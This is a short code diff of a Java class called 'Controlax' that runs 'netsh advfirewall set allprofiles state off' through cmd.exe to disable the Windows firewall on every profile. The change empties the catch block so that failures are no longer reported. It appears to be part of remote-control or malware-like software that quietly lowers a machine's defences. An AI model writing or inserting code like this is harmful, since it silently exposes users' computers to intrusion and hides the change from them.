@@ -112,7 +112,7 @@ public class Controlax {
 			ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", "netsh advfirewall set allprofiles state off");
 			builder.start();
 		} catch(Throwable Errors) {
-			Errors.printStackTrace();
+
 		}
 
 		Controlax.INSTANCE = new Controlax();
